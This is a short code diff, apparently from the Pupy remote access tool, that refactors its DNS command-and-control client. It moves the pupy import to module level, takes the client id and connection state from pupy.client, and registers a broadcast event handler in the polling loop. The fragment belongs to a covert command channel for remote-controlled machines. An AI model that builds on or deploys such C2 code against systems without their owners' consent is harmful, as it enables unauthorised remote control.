@@ -16,6 +16,8 @@ import time
 import uuid
 import netaddr
 
+import pupy
+
 from threading import Thread, Lock
 import ascii85
 
@@ -86,14 +88,6 @@ class DnsCommandsClient(Thread):
     def __init__(
             self, domain, key, doh=False, ns=None, qtype=None,
             ns_proto=socket.SOCK_DGRAM, ns_timeout=3):
-        try:
-            import pupy
-            self.pupy = pupy
-            self.pupy.broadcast_event = self._broadcast_event
-            self.cid = pupy.cid
-        except:
-            self.pupy = None
-            self.cid = 31337
 
         self.doh = doh
         self.iid = os.getpid() & 0xFFFF
@@ -324,7 +318,7 @@ class DnsCommandsClient(Thread):
 
         if CLIENT_VERSION > 1:
             node_block = data_append + struct.pack(
-                '>BIH', CLIENT_VERSION, self.cid, self.iid)
+                '>BIH', CLIENT_VERSION, pupy.client.cid, self.iid)
 
             node_block += to_bytes(self.node, 6)
 
@@ -556,7 +550,10 @@ class DnsCommandsClient(Thread):
 
         if self.spi:
             commands = self._request(
-                PupyState(bool(self.pupy.connection), self.pupy.manager.dirty),
+                PupyState(
+                    pupy.client.connected,
+                    pupy.manager.dirty
+                ),
                 SystemStatus())
         else:
             commands = self._request(Poll())
@@ -667,6 +664,8 @@ class DnsCommandsClient(Thread):
                 self.on_exit()
 
     def run(self):
+        pupy.set_broadcast_event(self._broadcast_event)
+
         while True:
             try:
                 if self.qtype is None:
@@ -685,3 +684,5 @@ class DnsCommandsClient(Thread):
                 time.sleep(self.poll)
             else:
                 break
+
+        pupy.set_broadcast_event(None)
